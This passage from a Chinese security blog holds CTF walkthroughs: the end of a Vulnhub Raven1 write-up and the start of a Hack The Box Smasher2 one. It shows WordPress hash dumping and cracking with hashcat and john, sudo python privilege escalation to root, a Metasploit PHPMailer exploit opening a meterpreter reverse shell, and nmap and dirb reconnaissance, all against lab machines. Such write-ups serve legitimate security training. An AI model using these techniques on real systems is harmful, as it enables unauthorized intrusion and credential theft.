<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql&gt; use wordpress;</span><br><span class="line">Reading table information <span class="keyword">for</span> completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; show tables;</span><br><span class="line">+-----------------------+</span><br><span class="line">| Tables_in_wordpress   |</span><br><span class="line">+-----------------------+</span><br><span class="line">| wp_commentmeta        |</span><br><span class="line">| wp_comments           |</span><br><span class="line">| wp_links              |</span><br><span class="line">| wp_options            |</span><br><span class="line">| wp_postmeta           |</span><br><span class="line">| wp_posts              |</span><br><span class="line">| wp_term_relationships |</span><br><span class="line">| wp_term_taxonomy      |</span><br><span class="line">| wp_termmeta           |</span><br><span class="line">| wp_terms              |</span><br><span class="line">| wp_usermeta           |</span><br><span class="line">| wp_users              |</span><br><span class="line">+-----------------------+</span><br><span class="line">12 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from wp_users;</span><br><span class="line">+----+------------+------------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+----------------+</span><br><span class="line">| ID | user_login | user_pass                          | user_nicename | user_email        | user_url | user_registered     | user_activation_key | user_status | display_name   |</span><br><span class="line">+----+------------+------------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+----------------+</span><br><span class="line">|  1 | michael    | <span class="variable">$P</span><span class="variable">$BjRvZQ</span>.VQcGZlDeiKToCQd.cPw5XCe0 | michael       | michael@raven.org |          | 2018-08-12 22:49:12 |                     |           0 | michael        |</span><br><span class="line">|  2 | steven     | <span class="variable">$P</span><span class="variable">$Bk3VD9jsxx</span>/loJoqNsURgHiaB23j7W/ | steven        | steven@raven.org  |          | 2018-08-12 23:31:16 |                     |           0 | Steven Seagull |</span><br><span class="line">+----+------------+------------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+----------------+</span><br><span class="line">2 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure>

<p>发现了两个哈希值，但是由于已经知道了Michael的密码，因此使用hashcat通过将哈希值粘贴到名为“password.txt”的文本文件中来破解了Steven的密码。<br>由于gpu性能太强，一秒出密码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">D:\hashcat-5.1.0\hashcat-5.1.0&gt;hashcat64.exe -a 0 -m 400 password.txt D:/wordlists/rockyou.txt</span><br><span class="line">hashcat (v5.1.0) starting...</span><br><span class="line"></span><br><span class="line">* Device <span class="comment">#1: WARNING! Kernel exec timeout is not disabled.</span></span><br><span class="line">             This may cause <span class="string">&quot;CL_OUT_OF_RESOURCES&quot;</span> or related errors.</span><br><span class="line">             To <span class="built_in">disable</span> the timeout, see: https://hashcat.net/q/timeoutpatch</span><br><span class="line">* Device <span class="comment">#2: Intel&#x27;s OpenCL runtime (GPU only) is currently broken.</span></span><br><span class="line">             We are waiting <span class="keyword">for</span> updated OpenCL drivers from Intel.</span><br><span class="line">             You can use --force to override, but <span class="keyword">do</span> not report related errors.</span><br><span class="line">nvmlInit(): Unknown Error</span><br><span class="line"></span><br><span class="line">OpenCL Platform <span class="comment">#1: NVIDIA Corporation</span></span><br><span class="line">======================================</span><br><span class="line">* Device <span class="comment">#1: GeForce GTX 1070, 2048/8192 MB allocatable, 16MCU</span></span><br><span class="line"></span><br><span class="line">OpenCL Platform <span class="comment">#2: Intel(R) Corporation</span></span><br><span class="line">========================================</span><br><span class="line">* Device <span class="comment">#2: Intel(R) UHD Graphics 630, skipped.</span></span><br><span class="line">* Device <span class="comment">#3: Intel(R) Core(TM) i7-8750H CPU @ 2.20GHz, skipped.</span></span><br><span class="line"></span><br><span class="line">Hashes: 1 digests; 1 unique digests, 1 unique salts</span><br><span class="line">Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates</span><br><span class="line">Rules: 1</span><br><span class="line"></span><br><span class="line">Applicable optimizers:</span><br><span class="line">* Zero-Byte</span><br><span class="line">* Single-Hash</span><br><span class="line">* Single-Salt</span><br><span class="line"></span><br><span class="line">Minimum password length supported by kernel: 0</span><br><span class="line">Maximum password length supported by kernel: 256</span><br><span class="line"></span><br><span class="line">ATTENTION! Pure (unoptimized) OpenCL kernels selected.</span><br><span class="line">This enables cracking passwords and salts &gt; length 32 but <span class="keyword">for</span> the price of drastically reduced performance.</span><br><span class="line">If you want to switch to optimized OpenCL kernels, append -O to your commandline.</span><br><span class="line"></span><br><span class="line">Watchdog: Temperature abort trigger <span class="built_in">set</span> to 90c</span><br><span class="line"></span><br><span class="line">Dictionary cache hit:</span><br><span class="line">* Filename..: D:/wordlists/rockyou.txt</span><br><span class="line">* Passwords.: 14344360</span><br><span class="line">* Bytes.....: 139921318</span><br><span class="line">* Keyspace..: 14344360</span><br><span class="line"></span><br><span class="line"><span class="variable">$P</span><span class="variable">$Bk3VD9jsxx</span>/loJoqNsURgHiaB23j7W/:pink84</span><br><span class="line"></span><br><span class="line">Session..........: hashcat</span><br><span class="line">Status...........: Cracked</span><br><span class="line">Hash.Type........: phpass, WordPress (MD5), phpBB3 (MD5), Joomla (MD5)</span><br><span class="line">Hash.Target......: <span class="variable">$P</span><span class="variable">$Bk3VD9jsxx</span>/loJoqNsURgHiaB23j7W/</span><br><span class="line">Time.Started.....: Fri Feb 14 19:47:16 2020 (1 sec)</span><br><span class="line">Time.Estimated...: Fri Feb 14 19:47:17 2020 (0 secs)</span><br><span class="line">Guess.Base.......: File (D:/wordlists/rockyou.txt)</span><br><span class="line">Guess.Queue......: 1/1 (100.00%)</span><br><span class="line">Speed.<span class="comment">#1.........:  1114.4 kH/s (7.11ms) @ Accel:512 Loops:128 Thr:64 Vec:1</span></span><br><span class="line">Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts</span><br><span class="line">Progress.........: 524288/14344360 (3.66%)</span><br><span class="line">Rejected.........: 0/524288 (0.00%)</span><br><span class="line">Restore.Point....: 0/14344360 (0.00%)</span><br><span class="line">Restore.Sub.<span class="comment">#1...: Salt:0 Amplifier:0-1 Iteration:8064-8192</span></span><br><span class="line">Candidates.<span class="comment">#1....: 123456 -&gt; chadj85</span></span><br><span class="line">Hardware.Mon.<span class="comment">#1..: N/A</span></span><br><span class="line"></span><br><span class="line">Started: Fri Feb 14 19:47:10 2020</span><br><span class="line">Stopped: Fri Feb 14 19:47:19 2020</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub213.jpg"></p>
<p>得到密码为pink84</p>
<p>当然也可以用john来破解，更加的方便，但是所需时间更长</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/raven1<span class="comment"># john hash</span></span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (phpass [phpass (<span class="variable">$P</span>$ or <span class="variable">$H</span>$) 256/256 AVX2 8x3])</span><br><span class="line">Cost 1 (iteration count) is 8192 <span class="keyword">for</span> all loaded hashes</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Proceeding with single, rules:Single</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">Almost <span class="keyword">done</span>: Processing the remaining buffered candidate passwords, <span class="keyword">if</span> any.</span><br><span class="line">Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist</span><br><span class="line">Proceeding with incremental:ASCII</span><br><span class="line">pink84           (?)</span><br><span class="line">1g 0:00:01:17 DONE 3/3 (2020-02-14 06:52) 0.01287g/s 47616p/s 47616c/s 47616C/s poslus..pingar</span><br><span class="line">Use the <span class="string">&quot;--show --format=phpass&quot;</span> options to display all of the cracked passwords reliably</span><br><span class="line">Session completed</span><br></pre></td></tr></table></figure>

<p>登录到steven的shell并运行sudo -l命令，发现Python不需要root权限即可运行。因此，使用python的单行代码生成了python PTY shell。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">michael@Raven:/tmp$ su steven</span><br><span class="line">Password: </span><br><span class="line">$ sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> steven on raven:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User steven may run the following commands on raven:</span><br><span class="line">    (ALL) NOPASSWD: /usr/bin/python</span><br><span class="line">$ sudo python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">root@Raven:/tmp<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@Raven:/tmp<span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line">root@Raven:/tmp<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>可以看到成功的提升到了root权限的shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@Raven:/tmp<span class="comment"># find / -name &quot;flag*&quot; 2&gt;/dev/null</span></span><br><span class="line">/var/www/flag2.txt</span><br><span class="line">/root/flag4.txt</span><br><span class="line">/usr/share/doc/apache2-doc/manual/tr/rewrite/flags.html</span><br><span class="line">/usr/share/doc/apache2-doc/manual/ja/rewrite/flags.html</span><br><span class="line">/usr/share/doc/apache2-doc/manual/ko/rewrite/flags.html</span><br><span class="line">/usr/share/doc/apache2-doc/manual/zh-cn/rewrite/flags.html</span><br><span class="line">/usr/share/doc/apache2-doc/manual/de/rewrite/flags.html</span><br><span class="line">/usr/share/doc/apache2-doc/manual/es/rewrite/flags.html</span><br><span class="line">/usr/share/doc/apache2-doc/manual/da/rewrite/flags.html</span><br><span class="line">/usr/share/doc/apache2-doc/manual/pt-br/rewrite/flags.html</span><br><span class="line">/usr/share/doc/apache2-doc/manual/fr/rewrite/flags.html</span><br><span class="line">/usr/share/doc/apache2-doc/manual/en/rewrite/flags.html</span><br><span class="line">/sys/devices/pci0000:00/0000:00:11.0/net/eth0/flags</span><br><span class="line">/sys/devices/virtual/net/lo/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS0/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS1/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS2/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS3/flags</span><br></pre></td></tr></table></figure>

<p>发现还是只有两个flag文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/var/www/flag2.txt</span><br><span class="line">/root/flag4.txt</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub214.jpg"></p>
<h3 id="继续寻找剩下的两个flag"><a href="#继续寻找剩下的两个flag" class="headerlink" title="继续寻找剩下的两个flag"></a>继续寻找剩下的两个flag</h3><p>通过目录扫描发现下面的url</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.56.118/service.html</span><br></pre></td></tr></table></figure>

<p>右键查看源码，发现flag</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub215.jpg"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;!-- flag1&#123;b9bbcb33e11b80be759c4e844862482d&#125; --&gt;</span><br></pre></td></tr></table></figure>

<p>还剩下最后一个flag，再次连接数据库，进入数据库查找</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@Raven:~<span class="comment"># mysql -uroot -pR@v3nSecurity</span></span><br><span class="line">Welcome to the MySQL monitor.  Commands end with ; or \g.</span><br><span class="line">Your MySQL connection id is 74</span><br><span class="line">Server version: 5.5.60-0+deb8u1 (Debian)</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.</span><br><span class="line"></span><br><span class="line">Oracle is a registered trademark of Oracle Corporation and/or its</span><br><span class="line">affiliates. Other names may be trademarks of their respective</span><br><span class="line">owners.</span><br><span class="line"></span><br><span class="line">Type <span class="string">&#x27;help;&#x27;</span> or <span class="string">&#x27;\h&#x27;</span> <span class="keyword">for</span> <span class="built_in">help</span>. Type <span class="string">&#x27;\c&#x27;</span> to clear the current input statement.</span><br><span class="line"></span><br><span class="line">mysql&gt; show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">| wordpress          |</span><br><span class="line">+--------------------+</span><br><span class="line">4 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; use wordpress;</span><br><span class="line">Reading table information <span class="keyword">for</span> completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; show tables;</span><br><span class="line">+-----------------------+</span><br><span class="line">| Tables_in_wordpress   |</span><br><span class="line">+-----------------------+</span><br><span class="line">| wp_commentmeta        |</span><br><span class="line">| wp_comments           |</span><br><span class="line">| wp_links              |</span><br><span class="line">| wp_options            |</span><br><span class="line">| wp_postmeta           |</span><br><span class="line">| wp_posts              |</span><br><span class="line">| wp_term_relationships |</span><br><span class="line">| wp_term_taxonomy      |</span><br><span class="line">| wp_termmeta           |</span><br><span class="line">| wp_terms              |</span><br><span class="line">| wp_usermeta           |</span><br><span class="line">| wp_users              |</span><br><span class="line">+-----------------------+</span><br><span class="line">12 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from wp_posts;</span><br><span class="linespan><br><span class="line">| ID | post_author | post_date           | post_date_gmt       | post_content                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            | post_title   | post_excerpt | post_status | comment_status | ping_status | post_password | post_name     | to_ping | pinged | post_modified       | post_modified_gmt   | post_content_filtered | post_parent | guid                                                             | menu_order | post_type | post_mime_type | comment_count |</span><br><span class="linespan><br><span class="line">|  1 |           1 | 2018-08-12 22:49:12 | 2018-08-12 22:49:12 | Welcome to WordPress. This is your first post. Edit or delete it, <span class="keyword">then</span> start writing| Hello world! |              | publish     | open           | open        |               | hello-world   |         |        | 2018-08-12 22:49:12 | 2018-08-12 22:49:12 |                       |           0 | http://192.168.206.131/wordpress/?p=1                            |          0 | post      |                |             1 |</span><br><span class="line">|  2 |           1 | 2018-08-12 22:49:12 | 2018-08-12 22:49:12 | This is an example page. It<span class="string">&#x27;s different from a blog post because it will stay in one place and will show up in your site navigation (in most themes). Most people start with an About page that introduces them to potential site visitors. It might say something like this:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;blockquote&gt;Hi there! I&#x27;</span>m a miner by day, aspiring actor by night, and this is my website. I live <span class="keyword">in</span> Kalgoorlie, have a great dog named Red, and I like yabbies. (And gettin<span class="string">&#x27; a tan.)&lt;/blockquote&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">...or something like this:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;blockquote&gt;The XYZ Doohickey Company was founded in 1971, and has been providing quality doohickeys to the public ever since. Located in Gotham City, XYZ employs over 2,000 people and does all kinds of awesome things for the Gotham community.&lt;/blockquote&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">As a new WordPress user, you should go to &lt;a href=&quot;http://192.168.206.131/wordpress/wp-admin/&quot;&gt;your dashboard&lt;/a&gt; to delete this page and create new pages for your content. Have fun! | Sample Page  |              | publish     | closed         | open        |               | sample-page   |         |        | 2018-08-12 22:49:12 | 2018-08-12 22:49:12 |                       |           0 | http://192.168.206.131/wordpress/?page_id=2                      |          0 | page      |                |             0 |</span></span><br><span class="line"><span class="string">|  4 |           1 | 2018-08-13 01:48:31 | 0000-00-00 00:00:00 | flag3&#123;afc01ab56b50591e7dccf93122770cd| flag3        |              | draft       | open           | open        |               |               |         |        | 2018-08-13 01:48:31 | 2018-08-13 01:48:31 |                       |           0 | http://raven.local/wordpress/?p=4                                |          0 | post      |                |             0 |</span></span><br><span class="line"><span class="string">|  5 |           1 | 2018-08-12 23:31:59 | 2018-08-12 23:31:59 | flag4&#123;715dea6c055b9fe3337544932f2941ce| flag4        |              | inherit     | closed         | closed      |               | 4-revision-v1 |         |        | 2018-08-12 23:31:59 | 2018-08-12 23:31:59 |                       |           4 | http://raven.local/wordpress/index.php/2018/08/12/4-revision-v1/ |          0 | revision  |                |             0 |</span></span><br><span class="line"><span class="string">|  7 |           2 | 2018-08-13 01:48:31 | 2018-08-13 01:48:31 | flag3&#123;afc01ab56b50591e7dccf93122770cd| flag3        |              | inherit     | closed         | closed      |               | 4-revision-v1 |         |        | 2018-08-13 01:48:31 | 2018-08-13 01:48:31 |                       |           4 | http://raven.local/wordpress/index.php/2018/08/13/4-revision-v1/ |          0 | revision  |                |             0 |</span></span><br><span class="line"><span class="stringspan></span><br><span class="line"><span class="string">5 rows in set (0.00 sec)</span></span><br></pre></td></tr></table></figure>

<p>最后一个flag,flag3终于找到</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">flag3&#123;afc01ab56b50591e7dccf93122770cd2&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub216.jpg"></p>
<h3 id="使用msf进行getshell的方法"><a href="#使用msf进行getshell的方法" class="headerlink" title="使用msf进行getshell的方法"></a>使用msf进行getshell的方法</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf5 exploit(multi/http/phpmailer_arg_injection) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/http/phpmailer_arg_injection):</span><br><span class="line"></span><br><span class="line">   Name        Current Setting  Required  Description</span><br><span class="line">   ----        ---------------  --------  -----------</span><br><span class="line">   Proxies                      no        A proxy chain of format <span class="built_in">type</span>:host:port[,<span class="built_in">type</span>:host:port][...]</span><br><span class="line">   RHOSTS      192.168.56.118   yes       The target host(s), range CIDR identifier, or hosts file with syntax <span class="string">&#x27;file:&lt;path&gt;&#x27;</span></span><br><span class="line">   RPORT       80               yes       The target port (TCP)</span><br><span class="line">   SSL         <span class="literal">false</span>            no        Negotiate SSL/TLS <span class="keyword">for</span> outgoing connections</span><br><span class="line">   TARGETURI   /contact.php     yes       Path to the application root</span><br><span class="line">   TRIGGERURI  /                no        Path to the uploaded payload</span><br><span class="line">   VHOST                        no        HTTP server virtual host</span><br><span class="line">   WEB_ROOT    /var/www/html    yes       Path to the web root</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (php/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST  192.168.56.102   yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   PHPMailer &lt;5.2.18</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(multi/http/phpmailer_arg_injection) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.56.102:4444 </span><br><span class="line">[*] Writing the backdoor to /var/www/html/XTXxkX1w.php</span><br><span class="line">[*] Sleeping before requesting the payload from: /XTXxkX1w.php</span><br><span class="line">[*] Waiting <span class="keyword">for</span> up to 300 seconds to trigger the payload</span><br><span class="line">[*] Sending stage (38288 bytes) to 192.168.56.118</span><br><span class="line">[*] Meterpreter session 2 opened (192.168.56.102:4444 -&gt; 192.168.56.118:34607) at 2020-02-14 08:02:30 -0500</span><br><span class="line">[+] Deleted /var/www/html/XTXxkX1w.php</span><br><span class="line">[+] Successfully triggered the payload</span><br><span class="line"></span><br><span class="line">meterpreter &gt; sysinfo</span><br><span class="line">Computer    : Raven</span><br><span class="line">OS          : Linux Raven 3.16.0-6-amd64 <span class="comment">#1 SMP Debian 3.16.57-2 (2018-07-14) x86_64</span></span><br><span class="line">Meterpreter : php/linux</span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 17423 created.</span><br><span class="line">Channel 0 created.</span><br><span class="line">id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">whoami</span><br><span class="line">www-data</span><br><span class="line">ls</span><br><span class="line">Security - Doc</span><br><span class="line">about.html</span><br><span class="line">contact.php</span><br><span class="line">contact.zip</span><br><span class="line">css</span><br><span class="line">elements.html</span><br><span class="line">fonts</span><br><span class="line">img</span><br><span class="line">index.html</span><br><span class="line">js</span><br><span class="line">scss</span><br><span class="line">service.html</span><br><span class="line">team.html</span><br><span class="line">vendor</span><br><span class="line">wordpress</span><br></pre></td></tr></table></figure>

<h3 id="知识点总结"><a href="#知识点总结" class="headerlink" title="知识点总结"></a>知识点总结</h3><ul>
<li>phpmailer漏洞getshell</li>
<li>wordpress用户名泄露</li>
<li>mysql udf提权</li>
<li>python suid提权</li>
</ul>
<p><font color="red">Game over</font></p>
<p>不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this…It’s a pity…</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
<p><font color="green"><strong><em>The end,to be continue…</em></strong></font></p>
]]></content>
      <categories>
        <category>vulnhub walkthrough</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>Hack-The-Box-walkthrough[Smasher2]</title>
    <url>/2019/12/26/Smasher2/</url>
    <content><![CDATA[<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p><font color="red">注意：本博客每一篇博客仅作记录供本人日后查阅。</font></p>
<p>难度：疯狂<br>点数：50<br>发布日期：2019年6月01日<br>IP:10.10.10.135</p>
<p>user.txt和root.txt的一血分别用了07小时13分55秒，20小时29分49秒，真够疯狂的。</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1.jpg"></li>
<li><img src="http://www.hackthebox.eu/badge/image/235857" alt="my htb rank"></li>
</ul>
<a id="more"></a>

<h3 id="开始之前"><a href="#开始之前" class="headerlink" title="开始之前"></a>开始之前</h3><p>注册hack the box需要邀请码，无非就是找到注册api然后解密两次，很简单,参考网址<span class="exturl" data-url="aHR0cHM6Ly9jb2RlYnVyc3QuaW8vaGFjay10aGUtYm94LWhvdy10by1nZXQtaW52aXRlLWNvZGUtNTZlMzY5ZmM4ZGFl">Hack The Box: How to get invite code<i class="fa fa-external-link-alt"></i></span>根据教程一步一步走就能获得注册码了，英文不好的小朋友自行谷歌翻译。</p>
<h3 id="准备入坑-Hack-The-Box"><a href="#准备入坑-Hack-The-Box" class="headerlink" title="准备入坑[Hack The Box]"></a>准备入坑[Hack The Box]</h3><p>htb的每一个靶场需要vpn连接才能使用，按照下图根据说明下载.ovpn文件，然后下载openvpn连接客户端，社区免费版下载网址<span class="exturl" data-url="aHR0cHM6Ly9vcGVudnBuLm5ldC9jb21tdW5pdHktZG93bmxvYWRzLw==">Openvpn Community Downloads<i class="fa fa-external-link-alt"></i></span>,下载安装完成后导入.ovpn文件点击连接即可打开靶机的网址。</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2.jpg"></p>
<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>老规矩上nmap</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -p- --min-rate 10000 10.10.10.135 -v -sV (快速扫描所有开放的tcp端口)</span></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">53/tcp open  domain  ISC BIND 9.11.3-1ubuntu1.3 (Ubuntu Linux)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line"></span><br><span class="line">root@kali:~<span class="comment"># nmap -p 22,53,80 -sC -sV -A -v 10.10.10.135 (扫描端口开放的服务)</span></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 23:a3:55:a8:c6:cc:74:cc:4d:c7:2c:f8:<span class="built_in">fc</span>:20:4e:5a (RSA)</span><br><span class="line">|   256 16:21:ba:ce:8c:85:62:04:2e:8c:79:fa:0e:ea:9d:33 (ECDSA)</span><br><span class="line">|_  256 00:97:93:b8:59:b5:0f:79:52:e1:8a:f1:4f:ba:ac:b4 (ED25519)</span><br><span class="line">53/tcp open  domain  ISC BIND 9.11.3-1ubuntu1.3 (Ubuntu Linux)</span><br><span class="line">| dns-nsid: </span><br><span class="line">|_  bind.version: 9.11.3-1ubuntu1.3-Ubuntu</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: 403 Forbidden</span><br><span class="line"></span><br><span class="line">root@kali:~<span class="comment"># nmap -sU -p- --min-rate 10000 -v 10.10.10.135 (快速扫描开放的udp端口)</span></span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">53/udp open  domain</span><br></pre></td></tr></table></figure>

<p>dirb爆破一波</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># dirb http://10.10.10.135/</span></span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Thu Dec 26 20:55:10 2019</span><br><span class="line">URL_BASE: http://10.10.10.135/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612                                                          </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://10.10.10.135/ ----</span><br><span class="line">+ http://10.10.10.135/.config (CODE:403|SIZE:294)                                                 </span><br><span class="line">+ http://10.10.10.135/_vti_bin/_vti_adm/admin.dll (CODE:403|SIZE:314)                             </span><br><span class="line">+ http://10.10.10.135/_vti_bin/_vti_aut/author.dll (CODE:403|SIZE:315)                            </span><br><span class="line">+ http://10.10.10.135/_vti_bin/shtml.dll (CODE:403|SIZE:305)                                      </span><br><span class="line">+ http://10.10.10.135/akeeba.backend.log (CODE:403|SIZE:305)                                      </span><br><span class="line">+ http://10.10.10.135/awstats.conf (CODE:403|SIZE:299)                                            </span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.135/backup/                                                        </span><br><span class="line">+ http://10.10.10.135/development.log (CODE:403|SIZE:302)                                         </span><br><span class="line">+ http://10.10.10.135/global.asa (CODE:403|SIZE:297)                                              </span><br><span class="line">+ http://10.10.10.135/global.asax (CODE:403|SIZE:298)                                                            </span><br><span class="line">+ http://10.10.10.135/index.html (CODE:200|SIZE:10918)                                                           </span><br><span class="line">+ http://10.10.10.135/main.mdb (CODE:403|SIZE:295)                                                               </span><br><span class="line">+ http://10.10.10.135/php.ini (CODE:403|SIZE:294)                                                 </span><br><span class="line">+ http://10.10.10.135/production.log (CODE:403|SIZE:301)                                          </span><br><span class="line">+ http://10.10.10.135/readfile (CODE:403|SIZE:414)                                                </span><br><span class="line">+ http://10.10.10.135/server-status (CODE:403|SIZE:300)                                           </span><br><span class="line">+ http://10.10.10.135/spamlog.log (CODE:403|SIZE:298)                                             </span><br><span class="line">+ http://10.10.10.135/thumbs.db (CODE:403|SIZE:296)                                               </span><br><span class="line">+ http://10.10.10.135/Thumbs.db (CODE:403|SIZE:296)                                               </span><br><span class="line">+ http://10.10.10.135/WS_FTP.LOG (CODE:403|SIZE:297) </span><br></pre></td></tr></table></figure>

<p>发现backup目录,这个把靶场刚发布时，/backup受.htpassword保护，该密码作为基本身份验证的弹出窗口显示，需要用hydra爆破用户名和密码，使用kali中的rockyou.txt字典。 但是现在此内容已从box中移除，因此，如果现在访问/backup，则会直接将您带进去。</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb3.jpg"></p>
<p>下载这两个文件。</p>
<p>由于53的tcp/udp端口都开放了，TCP上的DNS通常仅对区域传输开放。 这是要尝试的第一件事。 猜想域名是smasher.htb和smasher2.htb。 返回有趣的结果：</p>
